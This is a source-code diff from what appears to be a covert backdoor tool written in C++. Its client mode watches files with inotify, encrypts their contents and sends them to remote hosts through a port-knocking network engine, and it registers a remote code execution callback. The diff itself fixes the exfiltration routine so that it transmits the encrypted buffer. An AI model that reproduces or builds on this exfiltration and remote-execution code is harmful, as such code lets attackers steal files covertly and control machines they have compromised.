@@ -147,24 +147,24 @@ int clientMode(const Properties &p, char *programName) {
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
 
     // create file monitor
-    EventCallback unusedFunction = [&](FileMonitor *fm, struct inotify_event *e) {};
+    EventCallback blankFunc = [&](FileMonitor *fm, struct inotify_event *e) {};
     EventCallback exfiltrateFile = [&](FileMonitor *fm, struct inotify_event *e) {
         std::set<unsigned int> hosts = fm->getDestinations(e->wd);
 
         for (auto host : hosts) {
-            for (auto fullPath : fm->getFullPathsForHost(host, e->wd)) {
+            for (auto fullPath : fm->getFullPathsForHost(host, e)) {
                 if (fork() == 0) {
                     UCharVector buffer = fileToBuffer(fullPath);
                     UCharVector ciphertext = netEngine.getCrypto()->enc(buffer);
                     struct in_addr daddr;
                     daddr.s_addr = host;
-                    netEngine.knockAndSend(daddr, buffer);
+                    netEngine.knockAndSend(daddr, ciphertext);
                     exit(0);
                 }
             }
         }
     };
-    FileMonitor fm(exfiltrateFile, exfiltrateFile, unusedFunction);
+    FileMonitor fm(exfiltrateFile, blankFunc, blankFunc);
 
     // adding all the required callback functions
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
